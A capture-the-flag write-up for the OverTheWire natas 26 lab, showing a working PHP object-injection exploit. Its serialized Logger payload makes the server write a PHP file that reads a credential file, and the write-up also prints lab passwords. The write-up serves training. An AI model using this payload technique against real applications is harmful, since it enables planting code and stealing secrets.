# [natas 26](http://natas26.natas.labs.overthewire.org)

    Username: natas26
    Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

The level is about [php object injection](https://www.owasp.org/index.php/PHP_Object_Injection).
Let's create a new object using code below.

    <?php
        class Logger{
            private $logFile;
            private $initMsg;
            private $exitMsg;
            function __construct($file){
                $this->initMsg="";
                $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27') ?>";
                $this->logFile = "img/trojan.php";
            }
            function log($msg){
                ;
            }
            function __destruct(){
                ;
            }
        }
        $new_object = new Logger("hello");
        echo base64_encode(serialize($new_object));
    ?>

After serializing and encoding, we get the object.

    Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3Ryb2phbi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKSA/PiI7fQ==

Then replace cookie's drawing field with the object and browse to "trojan.php".

    http://natas26.natas.labs.overthewire.org/img/trojan.php

We steal the password successfully.

    55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
